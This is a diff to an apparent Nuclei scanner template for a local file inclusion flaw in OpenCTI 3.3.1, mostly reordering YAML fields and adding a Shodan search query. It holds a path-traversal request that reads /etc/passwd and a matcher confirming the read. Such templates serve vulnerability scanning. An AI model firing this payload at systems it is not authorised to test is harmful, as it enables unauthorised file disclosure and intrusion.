@@ -1,5 +1,4 @@
 id: opencti-lfi
-
 info:
   name: OpenCTI 3.3.1 - Local File Inclusion
   author: 0x_Akoko
@@ -14,23 +13,21 @@ info:
     cwe-id: CWE-22
     cpe: cpe:2.3:a:citeum:opencti:*:*:*:*:*:*:*:*
   metadata:
-    verified: true
     max-request: 1
+    product: opencti
+    shodan-query: http.html:"OpenCTI"
     vendor: citeum
-  tags: opencti,lfi,oss,vuln
-
+    verified: true
+  tags: lfi,opencti,oss,vuln
 http:
-  - method: GET
-    path:
-      - "{{BaseURL}}/static/css//../../../../../../../../etc/passwd"
-
-    matchers-condition: and
-    matchers:
-      - type: regex
-        regex:
-          - "root:[x*]:0:0"
-
-      - type: status
-        status:
+  - matchers:
+      - regex:
+          - root:[x*]:0:0
+        type: regex
+      - status:
           - 200
-
+        type: status
+    matchers-condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/static/css//../../../../../../../../etc/passwd'
